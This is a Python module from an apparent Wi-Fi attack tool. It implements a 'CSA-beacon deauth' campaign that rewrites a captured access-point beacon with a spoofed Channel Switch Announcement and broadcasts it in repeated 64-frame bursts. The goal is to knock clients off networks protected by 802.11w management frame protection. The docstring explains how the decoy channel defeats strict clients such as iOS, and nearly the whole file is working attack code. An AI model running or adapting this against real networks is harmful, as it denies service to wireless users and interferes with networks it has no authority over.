"""CSA-beacon deauth: force clients off a PMF-protected AP with a spoofed Channel Switch.

Management Frame Protection (802.11w) authenticates deauth/disassoc frames, so a classic deauth
burst is ignored by protected clients. Beacons are NOT protected (absent the rarely-deployed
beacon protection), so we take the AP's own beacon, append a Channel Switch Announcement element
advertising a move to a valid channel the AP is not on, and broadcast it in 64-frame bursts.
Clients that honor the CSA follow the AP onto an empty channel, miss beacons, and drop the link.
Mirrors aircrack-ng's ``aireplay-ng --csa`` (PR #2724), but targets a valid decoy channel rather
than aircrack's channel 14 (invalid outside JP, which strict clients like iOS reject outright).
"""
from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from wifit3.models import AccessPoint
from wifit3.dot11.csa import build_csa_beacon

from .campaign import Campaign

logger = logging.getLogger(__name__)

_BURST_SIZE = 64
_INTRA_BURST_S = 0.002
_INTER_BURST_S = 0.180


def csa_target_channel(ap_channel: int) -> int:
    """A valid decoy channel in the AP's own band that it isn't on, so a honoring client leaves it."""
    if ap_channel > 14:                       # 5GHz
        return 40 if ap_channel == 36 else 36
    return 6 if ap_channel == 1 else 1


@dataclass
class CsaStats:
    beacons_sent: int = 0
    bursts: int = 0
    started_at: float = field(default_factory=time.time)


class CsaDeauthAttack(Campaign):
    """Broadcast a CSA-rewritten beacon in bursts until stopped. Owns the radio."""

    button_id = "btn-csa"
    key = "csa"
    idle_label = "CSA"
    run_label = "Stop CSA"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        return bool(getattr(ap, "akms", None) or getattr(ap, "wpa3", False))

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        if not getattr(ap, "last_beacon_frame", None):
            return "no beacon captured yet"
        return None

    def __init__(self, array, target: AccessPoint,
                 log_callback: Optional[Callable[[str], None]] = None):
        if not target.last_beacon_frame:
            raise ValueError("CSA Deauth needs a captured beacon to rewrite; none seen yet.")
        super().__init__(ap=target, array=array)
        self.target = target
        self._log = log_callback or (lambda _msg: None)
        self.stats = CsaStats()
        self.target_channel = csa_target_channel(target.channel)
        self._frame = build_csa_beacon(target.last_beacon_frame, self.target_channel)

    async def _loop(self) -> None:
        self.stats = CsaStats()
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)
        logger.info("[CSA] %s (CH %s): broadcasting CSA→CH %s beacons",
                    self.target.bssid, self.target.channel, self.target_channel)
        while not self.stopped:
            for _ in range(_BURST_SIZE):
                if self.stopped:
                    return
                if await self.iface.send_no_wait(self._frame):
                    self.stats.beacons_sent += 1
                await asyncio.sleep(_INTRA_BURST_S)
            self.stats.bursts += 1
            await asyncio.sleep(_INTER_BURST_S)

    async def teardown(self) -> None:
        logger.info("[CSA] Stopped: %d beacons in %d bursts.",
                    self.stats.beacons_sent, self.stats.bursts)
